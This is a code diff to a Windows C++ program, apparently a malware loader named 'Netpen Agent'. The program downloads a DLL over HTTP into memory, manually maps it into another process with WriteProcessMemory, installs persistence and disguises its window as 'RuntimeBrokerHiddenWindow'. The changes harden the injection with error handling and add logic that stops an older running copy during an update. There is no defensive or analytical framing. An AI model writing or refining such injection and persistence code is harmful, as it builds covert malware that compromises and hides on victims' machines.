@@ -61,7 +61,7 @@ static std::vector<BYTE> HttpDownloadToMemory(const wchar_t* path) {
         size_t old = result.size();
         result.resize(old + size);
         DWORD downloaded = 0;
-        WinHttpReadData(hRequest, result.data() + old, size, &downloaded);
+        if (!WinHttpReadData(hRequest, result.data() + old, size, &downloaded) || downloaded == 0) break;
         result.resize(old + downloaded);
     }
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
@@ -262,15 +262,24 @@ static ULONGLONG MapSections(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS n
     if (!alloc) return 0;
     ULONGLONG remoteBase = (ULONGLONG)alloc;
 
-    WriteProcessMemory(hProcess, alloc, dllData, nt->OptionalHeader.SizeOfHeaders, NULL);
+    SIZE_T bytesWritten = 0;
+    if (!WriteProcessMemory(hProcess, alloc, dllData, nt->OptionalHeader.SizeOfHeaders, &bytesWritten) || bytesWritten != nt->OptionalHeader.SizeOfHeaders) {
+        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
+        return 0;
+    }
 
     PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         void* remoteAddr = (BYTE*)remoteBase + sections[i].VirtualAddress;
         BYTE* localData = dllData + sections[i].PointerToRawData;
         DWORD size = (sections[i].SizeOfRawData < sections[i].Misc.VirtualSize) ? sections[i].SizeOfRawData : sections[i].Misc.VirtualSize;
-        if (size > 0)
-            WriteProcessMemory(hProcess, remoteAddr, localData, size, NULL);
+        if (size > 0) {
+            bytesWritten = 0;
+            if (!WriteProcessMemory(hProcess, remoteAddr, localData, size, &bytesWritten) || bytesWritten != size) {
+                VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
+                return 0;
+            }
+        }
 
         DWORD protect = PAGE_READONLY;
         DWORD ch = sections[i].Characteristics;
@@ -473,15 +482,40 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     InitConfig();
     InstallPersistence();
 
-    HANDLE hAgentEvent = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
-    bool agentAlive = (hAgentEvent != NULL);
+    HANDLE hAgentEvent = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunningV2");
+    bool agentAlive = (hAgentEvent != NULL && WaitForSingleObject(hAgentEvent, 0) == WAIT_OBJECT_0);
     if (hAgentEvent) CloseHandle(hAgentEvent);
+    if (!agentAlive) {
+        HANDLE hOld = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
+        if (hOld) { agentAlive = true; CloseHandle(hOld); }
+    }
 
     int remoteVer = GetRemoteVersion();
     int storedVer = GetStoredVersion();
 
     if (agentAlive && remoteVer >= 0 && remoteVer <= storedVer)
         return 0;
+
+    if (agentAlive && remoteVer > storedVer) {
+        HANDLE hStop = CreateEventW(NULL, TRUE, FALSE, L"NetpenAgentStop");
+        if (hStop) SetEvent(hStop);
+        HWND hWnd = FindWindowW(L"RuntimeBrokerHiddenWindow", L"");
+        if (hWnd) PostMessageW(hWnd, WM_CLOSE, 0, 0);
+        for (int i = 0; i < 30; i++) {
+            HANDLE hRun = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunningV2");
+            if (!hRun) {
+                HANDLE hOld = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
+                if (!hOld) break;
+                CloseHandle(hOld);
+                break;
+            }
+            bool alive = (WaitForSingleObject(hRun, 0) == WAIT_OBJECT_0);
+            CloseHandle(hRun);
+            if (!alive) break;
+            Sleep(1000);
+        }
+        if (hStop) CloseHandle(hStop);
+    }
 
     HANDLE hMutex = CreateMutexW(NULL, TRUE, L"NetpenAgentInjection");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
